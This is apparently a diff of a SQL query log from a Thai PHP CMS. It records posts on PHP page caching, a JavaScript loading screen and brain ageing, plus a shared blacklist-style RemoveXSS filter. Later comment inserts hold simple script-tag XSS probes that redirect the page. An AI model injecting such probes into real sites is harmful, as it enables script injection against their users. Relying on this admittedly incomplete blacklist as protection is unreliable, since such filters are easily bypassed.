+&lt;p&gt;การทำ Cache แบบง่าย ๆ ด้วย php &lt;br /&gt;
+ลองดูละกันครับว่าง่ายดายขนาดไหน&lt;/p&gt;
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;',content_detail='&lt;h3 st<x>yle=&quot;color: red&quot;&gt;ง่ายๆครับ ไม่ยากเลย ทำความเข้าใจได้ไม่ยาก&lt;/h3&gt;
+&lt;p&gt;&lt;span st<x>yle=&quot;font-size: larger&quot;&gt;&lt;span st<x>yle=&quot;font-family: Arial&quot;&gt;&lt;code&gt;&amp;lt;?php&lt;br /&gt;
+&lt;span class=&quot;dark-code&quot;&gt;// start the output buffer&lt;/span&gt;&lt;br /&gt;
+ob_start(); ?&amp;gt;&lt;br /&gt;
+&lt;br /&gt;
+&lt;span class=&quot;dark-code&quot;&gt;//Your usual PHP sc<x>ript and HTML here ...&lt;/span&gt; &lt;br /&gt;
+&lt;br /&gt;
+&amp;lt;?php&lt;br /&gt;
+$cachefile = &amp;quot;cache/home.html&amp;quot;;&lt;br /&gt;
+&lt;span class=&quot;dark-code&quot;&gt;// open the cache file &amp;quot;cache/home.html&amp;quot; for writing&lt;/span&gt;&lt;br /&gt;
+$fp = fopen($cachefile \'w\'); &lt;br /&gt;
+&lt;span class=&quot;dark-code&quot;&gt;// save the contents of output buffer to the file&lt;/span&gt;&lt;br /&gt;
+fwrite($fp ob_get_contents()); &lt;br /&gt;
+&lt;span class=&quot;dark-code&quot;&gt;// close the file&lt;/span&gt;&lt;br /&gt;
+fclose($fp); &lt;br /&gt;
+&lt;span class=&quot;dark-code&quot;&gt;// Send the output to the browser&lt;/span&gt;&lt;br /&gt;
+ob_end_flush(); &lt;br /&gt;
+?&amp;gt;&lt;/code&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span st<x>yle=&quot;font-size: larger&quot;&gt;&lt;span st<x>yle=&quot;font-family: Arial&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;h3 st<x>yle=&quot;color: red&quot;&gt;&lt;span st<x>yle=&quot;font-size: larger&quot;&gt;&lt;span st<x>yle=&quot;font-family: Arial&quot;&gt;เพิ่มเติมอีกนิดตรวจสอบซะหน่อยว่ามันทำ Cache ไว้หรือยัง&lt;/span&gt;&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span st<x>yle=&quot;font-size: larger&quot;&gt;&lt;span st<x>yle=&quot;font-family: Arial&quot;&gt;&lt;code&gt;&amp;lt;?php&lt;br /&gt;
+&lt;br /&gt;
+$cachefile = &amp;quot;cache/home.html&amp;quot;;&lt;br /&gt;
+&lt;br /&gt;
+if (file_exists($cachefile)) {&lt;br /&gt;
+&lt;br /&gt;
+&lt;span class=&quot;dark-code&quot;&gt;// the page has been cached from an earlier request&lt;/span&gt;&lt;br /&gt;
+&lt;br /&gt;
+&lt;span class=&quot;dark-code&quot;&gt;// output the contents of the cache file&lt;/span&gt;&lt;br /&gt;
+&lt;br /&gt;
+include($cachefile); &lt;br /&gt;
+&lt;br /&gt;
+&lt;span class=&quot;dark-code&quot;&gt;// exit the sc<x>ript so that the rest isnt executed&lt;/span&gt;&lt;br /&gt;
+exit;&lt;br /&gt;
+&lt;br /&gt;
+}&lt;br /&gt;
+&lt;br /&gt;
+?&amp;gt;&lt;/code&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;h3&gt;&lt;b&gt;&lt;span st<x>yle=&quot;font-size: larger&quot;&gt;&lt;span st<x>yle=&quot;font-family: Arial&quot;&gt;&lt;code&gt;&lt;br /&gt;
+&lt;/code&gt;&lt;/span&gt;&lt;/span&gt;&lt;span st<x>yle=&quot;color: #ff0000&quot;&gt;&lt;span st<x>yle=&quot;font-size: larger&quot;&gt;&lt;span st<x>yle=&quot;font-family: Arial&quot;&gt;&lt;code&gt;กำหนดอายุไขให้มันซะหน่อยมะ&lt;/code&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/b&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span st<x>yle=&quot;font-size: larger&quot;&gt;&lt;span st<x>yle=&quot;font-family: Arial&quot;&gt;&lt;code&gt;&lt;br /&gt;
+&lt;/code&gt;&lt;code&gt;&amp;lt;?php &lt;br /&gt;
+&lt;br /&gt;
+&lt;span class=&quot;dark-code&quot;&gt;// 5 minutes&lt;/span&gt;&lt;br /&gt;
+$cachetime = 5 * 60; &lt;br /&gt;
+&lt;br /&gt;
+&lt;span class=&quot;dark-code&quot;&gt;// Serve from the cache if it is younger than $cachetime&lt;/span&gt;&lt;br /&gt;
+&lt;br /&gt;
+if (file_exists($cachefile) &amp;amp;&amp;amp; &lt;br /&gt;
+(time() - $cachetime &amp;lt; filemtime($cachefile))) &lt;br /&gt;
+{&lt;br /&gt;
+&lt;br /&gt;
+include($cachefile);&lt;br /&gt;
+&lt;br /&gt;
+echo &amp;quot;&amp;lt;!-- From cache generated &amp;quot;.date(\'H:i\' &lt;br /&gt;
+filemtime($cachefile)).&amp;quot; &lt;br /&gt;
+--&amp;gt;\\n&amp;quot;;&lt;br /&gt;
+&lt;br /&gt;
+exit;&lt;br /&gt;
+&lt;br /&gt;
+}&lt;br /&gt;
+&lt;br /&gt;
+?&amp;gt;&lt;/code&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
+&lt;h3&gt;&lt;span st<x>yle=&quot;color: #ff0000&quot;&gt;&lt;span st<x>yle=&quot;font-size: larger&quot;&gt;&lt;span st<x>yle=&quot;font-family: Arial&quot;&gt;&lt;code&gt;เป็นไงครับ ง่ายซะ อย่างงี้ก็หายเซ็งไปได้อีกนิด&lt;/code&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/h3&gt;
+&lt;p&gt;&lt;span st<x>yle=&quot;font-size: larger&quot;&gt;&lt;span st<x>yle=&quot;font-family: Arial&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;' Where content_id = 8 
+14:03:49 :  => Update content SET category_id='',content_name='ja<x>vasc<x>ript + PHP loading page...',content_summary='&lt;p&gt;&lt;img height=&quot;97&quot; width=&quot;128&quot; src=&quot;http://www.zengcode.com/files/FckAjaxFileManage/uploaded/icons/java.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;บางครั้งมี page บางหน้าโหลดนานมาก อาจจะติดต่อกับฐานข้อมูลหรือว่าอะไรก็ตาม&lt;br /&gt;
+เรามาทำหน้า preload โดยใช้ java sc<x>ript กันดูครับ&lt;/p&gt;',content_detail='&lt;p&gt;&amp;nbsp;&lt;/p&gt;
+&lt;p&gt;&amp;lt;html&amp;gt;&lt;br /&gt;
+&amp;lt;head&amp;gt;&lt;br /&gt;
+&amp;lt;ti<x>tle&amp;gt;Report&amp;lt;/ti<x>tle&amp;gt;&lt;br /&gt;
+&amp;lt;/head&amp;gt;&lt;br /&gt;
+&amp;lt;body on<x>load=&amp;quot;document.all.loading_la<x>yer.s&lt;wbr&gt;&lt;/wbr&gt;tyle.visib&lt;wbr&gt;&lt;/wbr&gt;ility = \'hidden\'; document.all.main_la<x>yer.st&lt;wbr&gt;&lt;/wbr&gt;yle.visibi&lt;wbr&gt;&lt;/wbr&gt;lity = \'visible\';&amp;quot;;&amp;gt;&lt;br /&gt;
+&amp;lt;div id=&amp;quot;loading_la<x>yer&amp;quot; st<x>yle=&amp;quot;position:absolute; width:100%; visibility:visible;&amp;quot;&amp;gt;&lt;br /&gt;
+&amp;lt;table width=&amp;quot;600&amp;quot; cellpadding=&amp;quot;0&amp;quot; cellspacing=&amp;quot;0&amp;quot; border=&amp;quot;0&amp;quot;&amp;gt;&lt;br /&gt;
+&amp;lt;tr&amp;gt;&lt;br /&gt;
+&amp;lt;td align=&amp;quot;center&amp;quot;&amp;gt;Building Report. Please Wait...&amp;lt;/td&amp;gt;&lt;br /&gt;
+&amp;lt;/tr&amp;gt;&lt;br /&gt;
+&amp;lt;/table&amp;gt;&lt;br /&gt;
+&amp;lt;/div&amp;gt;&lt;br /&gt;
+&lt;br /&gt;
+&amp;lt;div id=&amp;quot;main_la<x>yer&amp;quot; st<x>yle=&amp;quot;position:absolute; width:100%; visibility:hidden;&amp;quot;&amp;gt;&lt;br /&gt;
+&amp;lt;table width=&amp;quot;600&amp;quot; cellpadding=&amp;quot;0&amp;quot; cellspacing=&amp;quot;0&amp;quot; border=&amp;quot;0&amp;quot;&amp;gt;&lt;br /&gt;
+&amp;lt;tr&amp;gt;&lt;br /&gt;
+&amp;lt;td&amp;gt;SOME PHP CODE HERE ที่ทำงานช้าหรือว่านานมากๆๆๆๆๆๆๆๆๆๆๆๆๆๆๆๆ จนลูกค้าบ่นๆๆๆๆ หุหุ&amp;lt;/td&amp;gt;&lt;br /&gt;
+&amp;lt;/tr&amp;gt;&lt;br /&gt;
+&amp;lt;/table&amp;gt;&lt;br /&gt;
+&amp;lt;/div&amp;gt;&lt;br /&gt;
+&lt;br /&gt;
+&amp;lt;/body&amp;gt;&lt;br /&gt;
+&amp;lt;/html&amp;gt;&lt;/p&gt;
+&lt;p&gt;&amp;nbsp;&lt;/p&gt;' Where content_id = 13 
+14:03:49 :  => Update content SET category_id='',content_name='สมองคนเราเริ่มเสื่อมตั้งแต่อายุ 40 ปี',content_summary='&lt;p&gt;&lt;img height=&quot;97&quot; width=&quot;97&quot; alt=&quot;&quot; src=&quot;http://www.zengcode.com/files/FckAjaxFileManage/uploaded/icons/brain.jpg&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;นักประสาทวิทยามหาวิทยาลัยแคลิฟอร์เนีย ของอเมริกาเปิดเผยให้ทราบว่า ที่สมองของคนเราชักจะเริ่มเชื่องช้าลง &lt;br /&gt;
+เมื่ออายุ 40 ปี เป็นเพราะกลไกในสมองเริ่ม&lt;span st<x>yle=&quot;font-family: Arial;&quot;&gt;เสื่อมโทรม&lt;/span&gt;&lt;/p&gt;',content_detail='&lt;p&gt;&lt;span st<x>yle=&quot;font-family: Arial;&quot;&gt;นักประสาทวิทยามหาวิทยาลัยแคลิ ฟอร์เนีย ของอเมริกาเปิดเผยให้ทราบว่า ที่สมองของคนเราชักจะเริ่มเชื่องช้าลง เมื่ออายุ 40 ปี เป็นเพราะกลไกในสมองเริ่มเสื่อมโทรม&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span st<x>yle=&quot;font-family: Arial;&quot;&gt;ดร.ยอร์จ บาร์โซกิส นักประสาทวิทยาหัวหน้าคณะนักวิจัย กล่าวชี้ว่า ไม่ว่าจะขว้างลูกบอลหรือหักพวงมาลัยหลบหลีกได้ รวดเร็วแค่ไหน อยู่ที่เซลล์สมองจะยิงคำสั่งไปยังกล้ามเนื้อได้เร็วเท่าใด และการที่คำสั่งจะเดินทางไปได้เร็ว ก็ขึ้นอยู่กับฉนวนที่หุ้มสายที่โยงใยสมองว่ายังคงสภาพดีอยู่&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span st<x>yle=&quot;font-family: Arial;&quot;&gt;&lt;br /&gt;
+เขาบอกต่อไปว่า ตามปกติเมื่อคนเราย่างเข้าวัยกลางคน แม้ว่าจะยังคงแข็งแรงสมบูรณ์ดีอยู่ แต่ส่วนที่เป็นฉนวนในสมองส่วนที่ควบคุมการเคลื่อนไหว ก็ชักจะเริ่มเสื่อมลง ทำให้ความว่องไวลดลงไปตามส่วนด้วย&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span st<x>yle=&quot;font-family: Arial;&quot;&gt;&lt;br /&gt;
+คณะ นักวิจัยได้ยกให้เห็นความ สำคัญของการออกกำลังร่างกายและสมองว่า จะช่วยให้สมองเองพบฉนวนส่วนที่หลุดลุ่ยลง และแจ้งให้รีบซ่อมแซมเซลล์ให้ใช้งานโดยรีบด่วน&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span st<x>yle=&quot;font-family: Arial;&quot;&gt;ดร.ยอร์จ ได้เปรียบสมองว่าคล้ายกับอินเตอร์เน็ต ซึ่งความรวดเร็วขึ้นอยู่กับความกว้างของแถบคลื่น แต่ของสมองอยู่กับส่วนที่เรียกว่า ไมอีลิน ซึ่งเป็นแผ่นไขมันที่หุ้มใยประสาทอยู่&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span st<x>yle=&quot;font-family: Arial;&quot;&gt;&lt;br /&gt;
+ไมอีลีนที่สมบูรณ์ จะหุ้มเป็นฉนวนอยู่รอบใยประสาทอย่างแน่นหนา ทำให้ส่งสัญญาณไฟฟ้าที่สมองส่งคำสั่งได้ทันควัน ประจุไฟฟ้าความถี่สูง จะส่งให้ทำการเคลื่อนไหวได้อย่างว่องไว เขาได้ยกยอดนักบาสเกตบอล อย่างไมเคิล จอร์แดนเป็นตัวอย่างว่า &amp;quot;วงจรไฟฟ้าของสมองของเขา ที่สร้างให้เขาเป็นนักบาสผู้ยิ่งใหญ่ อาจจะเป็นเพราะมีไมอีลีนดีกว่ามนุษย์คนอื่นส่วนใหญ่&amp;quot;&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span st<x>yle=&quot;font-family: Arial;&quot;&gt;&lt;br /&gt;
+เพราะ ฉะนั้นถ้าใครที่ไม่อยากจะเจอภาวะสมองเสื่อมเร็วกว่ากำหนดละก็ ต้องเริ่มออกกำลังกายเสียตั้งแต่วันนี้แล้วนะคะ เพราะนอกจากจะช่วยป้องกันสมองเสื่อมเร็วแล้ว ยังช่วยให้ร่างกายแข็งแรงสามารถสู้รบกับโรคภัยต่าง ๆ ได้ด้วยค่ะ&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span st<x>yle=&quot;font-family: Arial;&quot;&gt;&lt;br /&gt;
+&amp;nbsp; &lt;br /&gt;
+&lt;/span&gt;&lt;/p&gt;' Where content_id = 11 
+14:03:42 :  => Delete From category Where category_id = 1 
+15:03:56 :  => Update static_content SET content_detail='<p><span st<x>yle=\"font-family: Arial;\"><img height=\"189\" align=\"left\" width=\"200\" alt=\"\" src=\"http://www.zengcode.com/files/FckAjaxFileManage/uploaded/icons/mvc.jpg\" st<x>yle=\"margin-right: 10px;\" /></span></p>
+<h3><span st<x>yle=\"font-family: Arial;\">สวัสดีครับแฟนๆ Madoogun.com ยินดีต้อนรับสู่บ้านใหม่ครับ</span></h3>
+<p><span st<x>yle=\"font-family: Arial;\"><b><span st<x>yle=\"color: rgb(153 51 0);\">ZengCode fr<x>amework</span></b> ขอฝากเนื้อฝากตัวกับชาว Developer ทุกท่านด้วยนะครับ<br />
+ผู้พัฒนาเองไม่ได้หวังว่ามันจะใช้งานได้ดีขนาดไปเทียบกับจ้างยุทธจักรด้านนี้ <br />
+ไม่ว่าจะเป็น Prado หรือแม้แต่ Cake ซึ่งนั้นเค้าระดับ<b><span st<x>yle=\"color: rgb(153 51 0);\">เทพเรียกพี่</span></b>แล้วครับ<br />
+ผมก็เป็นแค่ Developer ธรรมดา ๆ คนนึงครับ<br />
+ที่สร้าง fr<x>amework ตัวนี้ขึ้นมาก็เพื่อศึกษา และพัฒนาทักษะด้าน OOP ของตัวเอง</span><span st<x>yle=\"font-family: Arial;\"><br />
+อีกทั้งปกติตัวผมเองเขียนโค้ดได้มั่วซั่วมาก ไม่มีระเบียบ อยากเขียนอะไรคิดออกก็เขียน<br />
+ไม่มีแบบแผน บางทีกลับมาแก้โค้ดตัวเอง บอกได้คำเดียวว่า </span><b><span st<x>yle=\"color: rgb(153 51 0);\"><span st<x>yle=\"font-family: Arial;\">เซ็งโครต เซ็ง โครต โครต </span></span></b><span st<x>yle=\"font-family: Arial;\"><br />
+และนี่จึงเป็นที่มาของชื่อ fr<x>amework ของผมครับ<br />
+และอีกประเด็นก็เพื่อจุดประการให้พี่น้องชาว Developer ทุกท่าน <br />
+ช่วยกันคิดพัฒนาสิ่งต่างๆ เพื่อวงการด้าน IT<br />
+ของเราได้ทัดเทียมนานาอารยะประเทศเค้านะคร ับผมขอเป็นจุดเล็กๆจุดนึงที่พร้อมจะมุ่งมั่น<br />
+พัฒนาผลงานด้านนี้ต่อไปครับ สู้ๆ นะพี่น้องชาว Developer ทุกท่าน<img height=\"1077\" width=\"1001\" src=\"http://localhost/files/FckAjaxFileManage/uploaded/chiwa/emag_en.png\" alt=\"\" /></span></p>
+<p>&nbsp;</p>
+<hr />' Where content_key = 'hello' 
+15:03:26 :  => Update static_content SET content_detail='<p><span st=\"\"><x>yle=&quot;font-family: Arial;&quot;&gt;<img height=\"189\" align=\"left\" width=\"200\" st=\"\" src=\"http://www.zengcode.com/files/FckAjaxFileManage/uploaded/icons/mvc.jpg\" alt=\"\" /><x>yle=&quot;margin-right: 10px;&quot; /&gt;</x></x></span></p>
+<h3><span st=\"\"><x>yle=&quot;font-family: Arial;&quot;&gt;สวัสดีครับแฟนๆ Madoogun.com ยินดีต้อนรับสู่บ้านใหม่ครับ</x></span></h3>
+<p><span st=\"\"><x>yle=&quot;font-family: Arial;&quot;&gt;<b><span st=\"\"><x>yle=&quot;color: rgb(153 51 0);&quot;&gt;ZengCode fr<x>amework</x></x></span></b> ขอฝากเนื้อฝากตัวกับชาว Developer ทุกท่านด้วยนะครับ<br />
+ผู้พัฒนาเองไม่ได้หวังว่ามันจะใช้งานได้ดีขนาดไปเทียบกับจ้างยุทธจักรด้านนี้ <br />
+ไม่ว่าจะเป็น Prado หรือแม้แต่ Cake ซึ่งนั้นเค้าระดับ<b><span st=\"\"><x>yle=&quot;color: rgb(153 51 0);&quot;&gt;เทพเรียกพี่</x></span></b>แล้วครับ<br />
+ผมก็เป็นแค่ Developer ธรรมดา ๆ คนนึงครับ<br />
+ที่สร้าง fr<x>amework ตัวนี้ขึ้นมาก็เพื่อศึกษา และพัฒนาทักษะด้าน OOP ของตัวเอง</x></x></span><span st=\"\"><x>yle=&quot;font-family: Arial;&quot;&gt;<br />
+อีกทั้งปกติตัวผมเองเขียนโค้ดได้มั่วซั่วมาก ไม่มีระเบียบ อยากเขียนอะไรคิดออกก็เขียน<br />
+ไม่มีแบบแผน บางทีกลับมาแก้โค้ดตัวเอง บอกได้คำเดียวว่า </x></span><b><span st=\"\"><x>yle=&quot;color: rgb(153 51 0);&quot;&gt;<span st=\"\"><x>yle=&quot;font-family: Arial;&quot;&gt;เซ็งโครต เซ็ง โครต โครต </x></span></x></span></b><span st=\"\"><x>yle=&quot;font-family: Arial;&quot;&gt;<br />
+และนี่จึงเป็นที่มาของชื่อ fr<x>amework ของผมครับ<br />
+และอีกประเด็นก็เพื่อจุดประการให้พี่น้องชาว Developer ทุกท่าน <br />
+ช่วยกันคิดพัฒนาสิ่งต่างๆ เพื่อวงการด้าน IT<br />
+ของเราได้ทัดเทียมนานาอารยะประเทศเค้านะคร ับผมขอเป็นจุดเล็กๆจุดนึงที่พร้อมจะมุ่งมั่น<br />
+พัฒนาผลงานด้านนี้ต่อไปครับ สู้ๆ นะพี่น้องชาว Developer ทุกท่าน</x></x></span></p>
+<p>&nbsp;</p>
+<hr />' Where content_key = 'hello' 
+15:03:41 :  => Insert into content (category_id,content_name,content_summary,content_detail,post_date) Values ('1','มาป้องกัน Cross-Site sc<x>ripting อันร้ายกาจกันครับ','<p>มาป้องกัน Cross-Site sc<x>ripting อันร้ายกาจกันครับ<br />
+พอดีไปเจอมาช่วยได้เยอะครับ แต่ไม่แน่ใจว่าครอบคลุมหรือเปล่า<br />
+ตอนแรกผมก็โดน SQL Injection ด้วยและก็มี sc<x>ript บางตัวหลุด<br />
+อย่างที่ไม่คาดคิดว่ามันจะร้ายกาจได้ขนาดนี้ ต้องขอบคุณ พี่ด้า Inpross มากนะครับ<br />
+ที่อุตส่าห์นั่งหาสาเหตุกันตั้งนานสองนาน</p>','<p><b>เอาไปเลยครับ sc<x>ript </b></p>
+<p>function RemoveXSS($val) {<br />
+&nbsp;&nbsp; // remove all non-printable characters. CR(0a) and LF(0b) and TAB(9) are allowed<br />
+&nbsp;&nbsp; // this prevents some character re-spacing such as &lt;java\\0sc<x>ript&gt;<br />
+&nbsp;&nbsp; // note that you have to handle splits with \\n \\r and \\t later since they *are* allowed in some inputs<br />
+&nbsp;&nbsp; $val = preg_replace(\'/([\\x00-\\x08\\x0b-\\x0c\\x0e-\\x19])/\' \'\' $val);<br />
+&nbsp;&nbsp; <br />
+&nbsp;&nbsp; // straight replacements the user should never need these since they\'re normal characters<br />
+&nbsp;&nbsp; // this prevents like &lt;IMG SRC=&amp;#X40&amp;#X61&amp;#X76&amp;#X61&amp;#X73&amp;#X63&amp;#X72&amp;#X69&amp;#X70&amp;#X74&amp;#X3A &amp;#X61&amp;#X6C&amp;#X65&amp;#X72&amp;#X74&amp;#X28&amp;#X27&amp;#X58&amp;#X53&amp;#X53&amp;#X27&amp;#X29&gt;<br />
+&nbsp;&nbsp; $search = \'abcdefghijklmnopqrstuvwxyz\';<br />
+&nbsp;&nbsp; $search .= \'ABCDEFGHIJKLMNOPQRSTUVWXYZ\';<br />
+&nbsp;&nbsp; $search .= \'1234567890!@#$%^&amp;*()\';<br />
+&nbsp;&nbsp; $search .= \'~`&quot;;:?+/={}[]-_|\\\'\\\\\';<br />
+&nbsp;&nbsp; for ($i = 0; $i &lt; strlen($search); $i++) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // ;? matches the ; which is optional<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // 0{07} matches any padded zeros which are optional and go up to 8 chars<br />
+&nbsp;&nbsp; <br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // &amp;#x0040 @ search for the hex values<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $val = preg_replace(\'/(&amp;#[xX]0{08}\'.dechex(ord($search[$i])).\';?)/i\' $search[$i] $val); // with a ;<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // &amp;#00064 @ 0{07} matches \'0\' zero to seven times<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $val = preg_replace(\'/(&amp;#0{08}\'.ord($search[$i]).\';?)/\' $search[$i] $val); // with a ;<br />
+&nbsp;&nbsp; }<br />
+&nbsp;&nbsp; <br />
+&nbsp;&nbsp; // now the only remaining whitespace attacks are \\t \\n and \\r<br />
+&nbsp;&nbsp; $ra1 = Array(\'ja<x>vasc<x>ript\' \'vb<x>sc<x>ript\' \'ex<x>pression\' \'ap<x>plet\' \'me<x>ta\' \'xm<x>l\' \'bl<x>ink\' \'li<x>nk\' \'st<x>yle\' \'sc<x>ript\' \'em<x>bed\' \'ob<x>ject\' \'if<x>rame\' \'fr<x>ame\' \'fr<x>ameset\' \'il<x>ayer\' \'la<x>yer\' \'bg<x>sound\' \'ti<x>tle\' \'ba<x>se\');<br />
+&nbsp;&nbsp; $ra2 = Array(\'on<x>abort\' \'on<x>activate\' \'on<x>afterprint\' \'on<x>afterupdate\' \'on<x>beforeactivate\' \'on<x>beforecopy\' \'on<x>beforecut\' \'on<x>beforedeactivate\' \'on<x>beforeeditfocus\' \'on<x>beforepaste\' \'on<x>beforeprint\' \'on<x>beforeunload\' \'on<x>beforeupdate\' \'on<x>blur\' \'on<x>bounce\' \'on<x>cellchange\' \'on<x>change\' \'on<x>click\' \'on<x>contextmenu\' \'on<x>controlselect\' \'on<x>copy\' \'on<x>cut\' \'on<x>dataavailable\' \'on<x>datasetchanged\' \'on<x>datasetcomplete\' \'on<x>dblclick\' \'on<x>deactivate\' \'on<x>drag\' \'on<x>dragend\' \'on<x>dragenter\' \'on<x>dragleave\' \'on<x>dragover\' \'on<x>dragstart\' \'on<x>drop\' \'on<x>error\' \'on<x>errorupdate\' \'on<x>filterchange\' \'on<x>finish\' \'on<x>focus\' \'on<x>focusin\' \'on<x>focusout\' \'on<x>help\' \'on<x>keydown\' \'on<x>keypress\' \'on<x>keyup\' \'on<x>layoutcomplete\' \'on<x>load\' \'on<x>losecapture\' \'on<x>mousedown\' \'on<x>mouseenter\' \'on<x>mouseleave\' \'on<x>mousemove\' \'on<x>mouseout\' \'on<x>mouseover\' \'on<x>mouseup\' \'on<x>mousewheel\' \'on<x>move\' \'on<x>moveend\' \'on<x>movestart\' \'on<x>paste\' \'on<x>propertychange\' \'on<x>readystatechange\' \'on<x>reset\' \'on<x>resize\' \'on<x>resizeend\' \'on<x>resizestart\' \'on<x>rowenter\' \'on<x>rowexit\' \'on<x>rowsdelete\' \'on<x>rowsinserted\' \'on<x>scroll\' \'on<x>select\' \'on<x>selection<x>change\' \'on<x>selectstart\' \'on<x>start\' \'on<x>stop\' \'on<x>submit\' \'on<x>unload\');<br />
+&nbsp;&nbsp; $ra = array_merge($ra1 $ra2);<br />
+&nbsp;&nbsp; <br />
+&nbsp;&nbsp; $found = true; // keep replacing as long as the previous round replaced something<br />
+&nbsp;&nbsp; while ($found == true) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $val_before = $val;<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for ($i = 0; $i &lt; sizeof($ra); $i++) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern = \'/\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for ($j = 0; $j &lt; strlen($ra[$i]); $j++) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($j &gt; 0) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \'(\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \'(&amp;#[xX]0{08}([9ab]);)\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \'|\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \'|(&amp;#0{08}([9|10|13]);)\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \')*\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= $ra[$i][$j];<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $pattern .= \'/i\';<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $replacement = substr($ra[$i] 0 2).\'&lt;x&gt;\'.substr($ra[$i] 2); // add in &lt;&gt; to nerf the tag<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $val = preg_replace($pattern $replacement $val); // filter out the hex tags<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if ($val_before == $val) {<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; // no replacements were made so exit the loop<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $found = false;<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />
+&nbsp;&nbsp; }<br />
+&nbsp;&nbsp; return $val;<br />
+} <br />
+&nbsp;</p>
+<p><u><b>ที่มา </b></u>http://kallahar.com/smallprojects/php_xss_filter_function.php</p>',now()) 
+15:03:24 :  => Insert into comment (content_id,comment_detail,poster_name,posted_date) Values ('25','<sc<x>ript>','<br',now()) 
+15:03:24 :  => Insert into comment (content_id,comment_detail,poster_name,posted_date) Values ('25','document.location=\"www.yahoo.com\"','พี',now()) 
+15:03:43 :  => Insert into comment (content_id,comment_detail,poster_name,posted_date) Values ('25','<sc<x>ript>document.location=\"www.yahoo.com\" </sc<x>ript>','pee',now()) 
+16:03:56 :  => Insert into comment (content_id,comment_detail,poster_name,posted_date) Values ('25','<p><i><b>test</b></i></p>','test',now()) 
+16:03:42 :  => Insert into comment (content_id,comment_detail,poster_name,posted_date) Values ('25','<p>dsfdsf</p>','sdf',now()) 
+16:03:56 :  => Insert into comment (content_id,comment_detail,poster_name,posted_date) Values ('25','<p>dsfdsf</p>','sdf',now()) 
+16:03:29 :  => Update content SET category_id='1',content_name='xมาป้องกัน Cross-Site sc<x>ripting อันร้ายกาจกันครับ',content_summary='<p>มาป้องกัน Cross-Site sc<x>ripting อันร้ายกาจกันครับ<br />
+พอดีไปเจอมาช่วยได้เยอะครับ แต่ไม่แน่ใจว่าครอบคลุมหรือเปล่า<br />
+ตอนแรกผมก็โดน SQL Injection ด้วยและก็มี sc<x>ript บางตัวหลุด<br />
